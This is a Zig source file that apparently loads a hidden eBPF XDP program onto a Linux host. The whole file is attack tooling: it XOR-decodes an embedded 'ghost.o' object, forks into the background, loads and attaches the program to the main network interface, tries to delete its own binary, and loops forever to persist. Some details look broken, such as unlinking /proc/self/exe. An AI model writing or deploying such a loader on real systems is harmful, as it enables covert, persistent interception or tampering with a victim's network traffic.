const std = @import("std");
const sc = @import("syscalls.zig");

const BPF_PROG_LOAD = @as(u32, 5);
const BPF_LINK_CREATE = @as(u32, 28);

pub fn _start() noreturn {
    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
    inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }

    // Minimal ELF Parsing: Find the .text (bytecode) section
    const e_shoff = @as(*u64, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 40)).*;
    const e_shentsize = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 58)).*;
    const e_shnum = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 60)).*;
    
    var insns_ptr: usize = 0;
    var insns_cnt: u32 = 0;

    for (0..e_shnum) |i| {
        const shdr_ptr = @intFromPtr(bpf_blob.ptr) + e_shoff + (i * e_shentsize);
        const sh_type = @as(*u32, @ptrFromInt(shdr_ptr + 4)).*;
        const sh_size = @as(*u64, @ptrFromInt(shdr_ptr + 32)).*;
        const sh_offset = @as(*u64, @ptrFromInt(shdr_ptr + 24)).*;
        
        if (sh_type == 1 and sh_size > 0) { // SHT_PROGBITS
            insns_ptr = @intFromPtr(bpf_blob.ptr) + sh_offset;
            insns_cnt = @intCast(sh_size / 8);
            break;
        }
    }

    const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
    const child = sc.clone(0x00000100 | 17, stack + 65536);
    if (child != 0) sc.exit(0);

    const license = "GPL";
    const attr = sc.bpf_attr_load{
        .prog_type = 6, // BPF_PROG_TYPE_XDP
        .insn_cnt = insns_cnt,
        .insns = insns_ptr,
        .license = @intFromPtr(license.ptr),
        .log_level = 0,
    };

    const prog_fd = sc.bpf_syscall(BPF_PROG_LOAD, &attr, @sizeOf(sc.bpf_attr_load));
    
    // Auto-Targeting: Hardcoding 2 (usually eth0/ens3)
    const link_attr = sc.bpf_attr_link{
        .prog_fd = @intCast(prog_fd),
        .target_ifindex = 2, 
        .attach_type = 37,
    };

    _ = sc.bpf_syscall(BPF_LINK_CREATE, &link_attr, @sizeOf(sc.bpf_attr_link));

    _ = sc.unlink("/proc/self/exe");

    // Persistence Paradox: Stay alive in the background to keep the Link FD open
    while (true) {
        _ = sc.nanosleep(3600);
    }
}
